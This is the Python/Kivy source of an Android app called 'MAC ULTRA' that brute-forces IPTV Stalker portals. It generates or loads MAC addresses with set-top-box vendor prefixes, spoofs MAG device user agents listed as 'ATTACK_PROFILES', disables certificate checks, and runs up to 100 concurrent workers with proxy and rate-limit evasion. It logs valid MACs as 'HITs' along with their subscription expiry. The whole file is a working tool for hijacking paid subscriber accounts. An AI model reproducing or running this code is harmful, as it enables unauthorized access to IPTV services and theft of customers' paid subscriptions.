import os, asyncio, time, random, ssl, json, socket, urllib.parse, httpx
from datetime import datetime
from threading import Thread

from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.spinner import Spinner
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.slider import Slider
from kivy.uix.progressbar import ProgressBar
from kivy.uix.image import Image
from kivy.uix.modalview import ModalView
from kivy.core.clipboard import Clipboard
from kivy.graphics import Color, RoundedRectangle
from kivy.uix.screenmanager import Screen
from kivy.clock import Clock
from kivy.core.window import Window

# --- Konstanten aus V5 ---
BG_DARK = (0.01, 0.02, 0.04, 1)
CARD_COLOR = (0.05, 0.07, 0.12, 1)
CYAN = (0, 0.9, 1, 1)
GREEN = (0, 1, 0.5, 1)
RED = (1, 0.2, 0.2, 1)
YELLOW = (1, 0.8, 0, 1)
WHITE = (1, 1, 1, 1)
MAC_VARIANTS = ('00:1A:79:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:', '04:D6:AA:', '00:1B:79:', '00:2A:01:')
COMMON_PORTS = [80, 8080, 8880, 25461, 8000, 2082, 2086, 2095, 8443, 443]
ATTACK_PROFILES = [
    {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721', 'X-User-Agent': 'Model: MAG254; Link: Ethernet'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, wie Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'},
    {'User-Agent': 'okhttp/4.9.1'},
    {'User-Agent': 'Kodi/20.2 (X11; Linux x86_64) App_Bitness/64'},
    {'User-Agent': 'Mozilla/5.0 (SMART-TV; Linux; Tizen 6.0) AppleWebkit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/76.0.3809.146 TV Safari/537.36'}
]

# --- UI KLASSEN (Styled) ---
class StyledCard(BoxLayout):
    def __init__(self, bg_color=CARD_COLOR, radius=[15,], **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledButton(Button):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledSpinner(Spinner):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

# --- MAIN SCREEN ---
class MagUltraScreen(Screen):
    def __init__(self, context, **kw):
        super().__init__(**kw)
        self.context = context
        self.box = BoxLayout(orientation="vertical", padding=[20, 35, 20, 20], spacing=15)
        Window.clearcolor = BG_DARK
        
        # Engine State (V5)
        self.hits, self.checked, self.total_lines, self.running = 0, 0, 0, False
        self.hit_list, self.last_status, self.start_time = [], "READY", time.time()
        self.working_proxies, self.use_proxies = [], False
        self.portal_isp = "Unknown"
        self.current_api_path = "/portal.php"
        self.current_api_method = "GET"
        
        self.setup_ui()

    def setup_ui(self):
        # Banner
        self.box.add_widget(Image(source=self.context["paths"]["png"], size_hint_y=None, height=320, allow_stretch=True, keep_ratio=False))
        
        # Stats Grid
        stats = GridLayout(cols=3, size_hint_y=None, height=110, spacing=15)
        self.cpm_label = self.create_stat_box(stats, "CPM", "0", YELLOW)
        self.status_code_label = self.create_stat_box(stats, "STATUS", "READY", CYAN)
        self.hit_count_label = self.create_stat_box(stats, "MAC ULTRA HITS", "0", GREEN)
        self.box.add_widget(stats)
        
        # Portal Card
        url_card = StyledCard(orientation="vertical", size_hint_y=None, height=380, padding=15, spacing=12)
        self.portal_input = TextInput(text="http://", multiline=False, height=75, background_color=(0.1, 0.1, 0.1, 1), foreground_color=WHITE)
        
        filter_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.portal_file_spinner = StyledSpinner(text="SELECT PORTAL LIST", values=self.load_portal_lists(), size_hint_x=0.6, color=YELLOW)
        self.country_filter = TextInput(hint_text="LAND (z.B. DE)", multiline=False, size_hint_x=0.4, background_color=(0.1, 0.12, 0.15, 1), foreground_color=WHITE)
        filter_row.add_widget(self.portal_file_spinner); filter_row.add_widget(self.country_filter)
        
        det_row = BoxLayout(size_hint_y=None, height=50, spacing=10)
        self.engine_mode = StyledSpinner(text="MAC SCAN", values=("MAC SCAN", "M3U SCAN"), size_hint_x=0.4, color=CYAN)
        self.detail_slider = Slider(min=0, max=1, value=0, step=1, size_hint_x=0.2)
        self.detail_status = Label(text="NUR MAC/URL", color=RED, size_hint_x=0.4)
        self.detail_slider.bind(value=self.update_slider_label)
        det_row.add_widget(self.engine_mode); det_row.add_widget(self.detail_slider); det_row.add_widget(self.detail_status)
        
        btn_row = BoxLayout(spacing=15, size_hint_y=None, height=75)
        btn_row.add_widget(StyledButton(text="PASTE", on_press=lambda x: setattr(self.portal_input, 'text', Clipboard.paste()), color=CYAN))
        btn_row.add_widget(StyledButton(text="FAVORITEN", color=YELLOW))
        
        url_card.add_widget(self.portal_input); url_card.add_widget(filter_row); url_card.add_widget(det_row); url_card.add_widget(btn_row)
        self.box.add_widget(url_card)
        
        # Config Card
        cfg_card = StyledCard(orientation="vertical", size_hint_y=None, height=340, padding=15, spacing=10)
        m_row = BoxLayout(spacing=10, size_hint_y=None, height=60)
        self.scan_mode = StyledSpinner(text="COMBO FILE", values=("COMBO FILE", "RANDOM SCAN"))
        self.prefix_spinner = StyledSpinner(text="MAC's", values=MAC_VARIANTS, color=YELLOW)
        m_row.add_widget(self.scan_mode); m_row.add_widget(self.prefix_spinner)
        
        self.file_spinner = StyledSpinner(text="SELECT COMBO", values=self.load_combos(), height=60, color=CYAN)
        self.random_count = TextInput(text="1000", input_filter="int", height=60, halign="center")
        
        delay_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.delay_mode_spinner = StyledSpinner(text="NORMAL", values=("NORMAL", "SMART: 1-3s", "SMART: 2-4s", "SMART: 3-6s"), color=YELLOW)
        self.delay_value_display = Label(text="0.10s", color=YELLOW, size_hint_x=0.2)
        self.delay_slider = Slider(min=0.0, max=2.0, value=0.1, step=0.05, size_hint_x=0.4)
        self.delay_slider.bind(value=lambda i, v: setattr(self.delay_value_display, 'text', f"{v:.2f}s"))
        delay_row.add_widget(self.delay_mode_spinner); delay_row.add_widget(self.delay_value_display); delay_row.add_widget(self.delay_slider)
        
        bot_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.bot_label = Label(text="BOTS: 40", color=CYAN, size_hint_x=0.3)
        self.bot_slider = Slider(min=1, max=100, value=40, step=1, size_hint_x=0.7)
        self.bot_slider.bind(value=lambda i, v: setattr(self.bot_label, 'text', f"BOTS: {int(v)}"))
        bot_row.add_widget(self.bot_label); bot_row.add_widget(self.bot_slider)
        
        cfg_card.add_widget(m_row); cfg_card.add_widget(self.file_spinner); cfg_card.add_widget(self.random_count); cfg_card.add_widget(delay_row); cfg_card.add_widget(bot_row)
        self.box.add_widget(cfg_card)
        
        # Proxy Card
        proxy_card = StyledCard(orientation="horizontal", size_hint_y=None, height=70, padding=10, spacing=10)
        self.proxy_source = StyledSpinner(text="FILE", values=("FILE", "FREE (ProxyScrape)"), size_hint_x=0.35)
        self.proxy_spinner = StyledSpinner(text="SELECT PROXY", values=self.load_proxies(), size_hint_x=0.35)
        self.proxy_toggle_btn = StyledButton(text="PROXY: OFF", size_hint_x=0.3, color=RED, on_press=self.toggle_proxy)
        proxy_card.add_widget(self.proxy_source); proxy_card.add_widget(self.proxy_spinner); proxy_card.add_widget(self.proxy_toggle_btn)
        self.box.add_widget(proxy_card)
        
        # Progress & Log
        self.progress_label = Label(text="PROGRESS: 0 / 0", size_hint_y=None, height=20, color=CYAN)
        self.pbar = ProgressBar(max=100, value=0, size_hint_y=None, height=10)
        self.box.add_widget(self.progress_label); self.box.add_widget(self.pbar)
        
        self.scroll = ScrollView()
        self.log_display = Label(text="Ready...", font_size="14sp", size_hint_y=None, markup=True, halign="left", valign="top")
        self.log_display.bind(size=self.log_display.setter('text_size'))
        self.scroll.add_widget(self.log_display)
        self.box.add_widget(self.scroll)
        
        # Bottom Buttons
        bottom_row = BoxLayout(size_hint_y=None, height=110, spacing=15)
        self.start_btn = StyledButton(text="START MAC ULTRA", size_hint_x=0.7, on_press=self.toggle, bg_color=(0.05, 0.15, 0.1, 1), color=GREEN)
        self.music_stop_btn = StyledButton(text="STOP MUSIC", size_hint_x=0.3, bg_color=(0.15, 0.05, 0.05, 1), color=RED)
        bottom_row.add_widget(self.start_btn); bottom_row.add_widget(self.music_stop_btn)
        self.box.add_widget(bottom_row)
        
        self.add_widget(self.box)

    # --- ENGINE LOGIK (1:1 V5) ---

    async def find_working_port(self, base_url):
        clean_url = base_url.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
        for port in COMMON_PORTS:
            if not self.running: return None
            try:
                conn = asyncio.open_connection(clean_url, port)
                _, writer = await asyncio.wait_for(conn, timeout=1.2)
                writer.close(); await writer.wait_closed()
                return f"http://{clean_url}:{port}"
            except: continue
        return None

    async def get_portal_isp_info(self, url):
        try:
            domain = url.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
            async with httpx.AsyncClient(timeout=5) as client:
                r = await client.get(f"http://ip-api.com/json/{domain}")
                d = r.json()
                if d.get('status') == 'success':
                    return f"[{d.get('countryCode', '??')}] {d.get('country')} | {d.get('isp', 'Unknown')}"
        except: pass
        return "[??] Unknown ISP"

    async def discover_best_api(self, portal, ctx):
        paths = ["/portal.php", "/player_api.php"]
        async with httpx.AsyncClient(verify=ctx, timeout=5.0) as client:
            for p in paths:
                try:
                    r = await client.get(f"{portal}{p}?action=handshake")
                    if r.status_code == 200: return p, "GET"
                except: continue
        return "/portal.php", "GET"

    def get_clean_time(self, raw):
        raw_str = str(raw).strip()
        if raw_str.isdigit() and len(raw_str) >= 9:
            try:
                dt = datetime.fromtimestamp(int(raw_str))
                days_diff = (dt - datetime.now()).days
                return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
            except: pass
        if not raw_str or raw_str.lower() in ["unlimited", "none", "0", "false"]:
            return "Unlimited", "Unlimited"
        try:
            for fmt in ("%B %d, %Y", "%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y"):
                try:
                    dt = datetime.strptime(raw_str.split(',')[0], fmt)
                    days_diff = (dt - datetime.now()).days
                    return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
                except: continue
        except: pass
        return raw_str, "Unlimited"

    async def smart_sleep(self, status):
        mode = self.delay_mode_spinner.text
        if "1-3s" in mode: d = random.uniform(1, 3)
        elif "2-4s" in mode: d = random.uniform(2, 4)
        elif "3-6s" in mode: d = random.uniform(3, 6)
        else: d = self.delay_slider.value
        if status == 429: await asyncio.sleep(20)
        await asyncio.sleep(d)

    async def process_check(self, line, portal, ctx):
        if not self.running: return
        p_name = portal.replace("http://", "").replace("https://", "").split(":")[0]
        ua = random.choice(ATTACK_PROFILES)
        
        async with httpx.AsyncClient(verify=ctx, timeout=12, follow_redirects=True) as client:
            try:
                if self.engine_mode.text == "MAC SCAN":
                    mac = line.strip().upper()
                    stb_h = {**ua, "Cookie": f"mac={urllib.parse.quote(mac)}; stb_lang=en;"}
                    
                    # Handshake
                    r = await client.get(f"{portal}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml", headers=stb_h)
                    self.last_status = str(r.status_code)
                    
                    if r.status_code == 200 and 'token' in r.text:
                        tk = r.json().get('js', {}).get('token')
                        stb_h["Authorization"] = f"Bearer {tk}"
                        
                        # Account Info
                        ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=stb_h)
                        self.last_status = str(ri.status_code)
                        
                        if ri.status_code == 200:
                            js = ri.json().get('js', {})
                            exp_raw = js.get('end_date') or js.get('phone') or "Unlimited"
                            exp, days = self.get_clean_time(exp_raw)
                            
                            self.hits += 1
                            self.update_log_safe(f"[color=808080][{p_name}][/color] [color=00FF80][HIT][/color] {mac} | [color=00FFFF]{days}[/color]")
                else:
                    # M3U Scan Logik...
                    pass
            except: self.last_status = "ERR"

    async def worker(self, queue, ctx, portals):
        while self.running and not queue.empty():
            line = await queue.get()
            tasks = [self.process_check(line, p, ctx) for p in portals]
            await asyncio.gather(*tasks)
            
            await self.smart_sleep(int(self.last_status) if self.last_status.isdigit() else 200)
            self.checked += 1
            Clock.schedule_once(lambda dt: self.refresh_ui())
            queue.task_done()

    async def engine(self):
        # Portal Normalisierung (V5)
        portals = []
        single = self.portal_input.text.strip().split('/c')[0].rstrip('/')
        if single.startswith("http"):
            if ":" not in single.replace("http://", "").replace("https://", ""):
                found = await self.find_working_port(single)
                if found: portals = [found]
            else: portals = [single]
        
        if not portals: 
            self.update_log_safe("[color=FF0000][ERROR][/color] Kein Portal!"); self.running = False; return

        # Init V5
        ctx = ssl.create_default_context(); ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
        self.current_api_path, self.current_api_method = await self.discover_best_api(portals[0], ctx)
        self.portal_isp = await self.get_portal_isp_info(portals[0])
        self.update_log_safe(f"[color=FFFF00][INFO][/color] Server: {self.portal_isp}")

        # Combo laden
        path = f"/sdcard/Combo/{self.file_spinner.text}"
        if self.scan_mode.text == "COMBO FILE" and os.path.exists(path):
            with open(path, 'r', errors='ignore') as f: combo = [l.strip() for l in f if l.strip()]
        else:
            prefix = self.prefix_spinner.text if self.prefix_spinner.text != "MAC's" else "00:1A:79:"
            combo = [f"{prefix}{':'.join([f'{random.randint(0,255):02X}' for _ in range(3)])}" for _ in range(int(self.random_count.text or 100))]
        
        self.total_lines, self.checked, self.hits, self.start_time = len(combo), 0, 0, time.time()
        Clock.schedule_once(lambda dt: setattr(self.pbar, 'max', self.total_lines))
        
        queue = asyncio.Queue()
        for l in combo: queue.put_nowait(l)
        
        await asyncio.gather(*[self.worker(queue, ctx, portals) for _ in range(int(self.bot_slider.value))])
        self.running = False
        Clock.schedule_once(lambda dt: self.reset_start_btn())

    # --- UI UTILS ---

    def toggle(self, *_):
        if not self.running:
            self.running = True
            self.start_btn.text, self.start_btn.color = "STOP SCAN", RED
            Thread(target=lambda: asyncio.run(self.engine()), daemon=True).start()
        else:
            self.running = False
            self.reset_start_btn()

    def reset_start_btn(self, *a):
        self.start_btn.text, self.start_btn.color = "START MAC ULTRA", GREEN

    def refresh_ui(self, *a):
        self.pbar.value = self.checked
        self.hit_count_label.text = str(self.hits)
        self.status_code_label.text = self.last_status
        self.progress_label.text = f"PROGRESS: {self.checked} / {self.total_lines}"
        el = time.time() - self.start_time
        if el > 0: self.cpm_label.text = str(int((self.checked / el) * 60))

    def update_log_safe(self, t): Clock.schedule_once(lambda dt: self._do_log(t))
    def _do_log(self, t):
        self.hit_list.append(t)
        if len(self.hit_list) > 10: self.hit_list.pop(0)
        self.log_display.text = "\n".join(self.hit_list)
        self.log_display.height = self.log_display.texture_size[1] + 20

    def create_stat_box(self, p, t, v, c):
        box = StyledCard(orientation="vertical", padding=8)
        box.add_widget(Label(text=t, font_size="11sp", color=(0.7,0.7,0.7,1)))
        lbl = Label(text=v, font_size="24sp", bold=True, color=c)
        box.add_widget(lbl); p.add_widget(box); return lbl

    def update_slider_label(self, i, v): self.detail_status.text, self.detail_status.color = ("ALLES SPEICHERN", GREEN) if v == 1 else ("NUR MAC/URL", RED)
    def load_combos(self): return sorted([f for f in os.listdir("/sdcard/Combo/") if f.endswith(".txt")]) if os.path.exists("/sdcard/Combo/") else ["EMPTY"]
    def load_proxies(self): return sorted([f for f in os.listdir("/storage/emulated/0/proxies/") if f.endswith(".txt")]) if os.path.exists("/storage/emulated/0/proxies/") else ["EMPTY"]
    def load_portal_lists(self): return ["USE SINGLE"]
    def toggle_proxy(self, btn):
        self.use_proxies = not self.use_proxies
        btn.text, btn.color = ("PROXY: ON", GREEN) if self.use_proxies else ("PROXY: OFF", RED)

def create_app_screen(context):
    return MagUltraScreen(context=context, name="main")
